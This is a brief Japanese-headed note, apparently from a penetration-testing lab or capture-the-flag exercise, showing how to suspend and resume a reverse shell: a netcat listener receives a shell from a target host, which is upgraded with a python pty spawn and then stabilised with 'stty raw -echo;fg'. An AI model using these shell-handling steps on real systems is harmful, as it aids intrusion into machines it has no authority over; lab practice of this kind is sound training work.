# サスペンド（一時停止）
```zsh
rlwrap -cAr nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.248.117] 48652
python3 -c 'import pty;pty.spawn("/bin/bash")'
[cmeeks@hetemit restjson_hetemit]$ whoami
whoami
cmeeks
[cmeeks@hetemit restjson_hetemit]$ 
zsh: suspended  rlwrap -cAr nc -lvnp 18000
```

# 再開
```zsh
stty raw -echo;fg
[1]  + continued  rlwrap -cAr nc -lvnp 18000
[cmeeks@hetemit restjson_hetemit]$ 
```
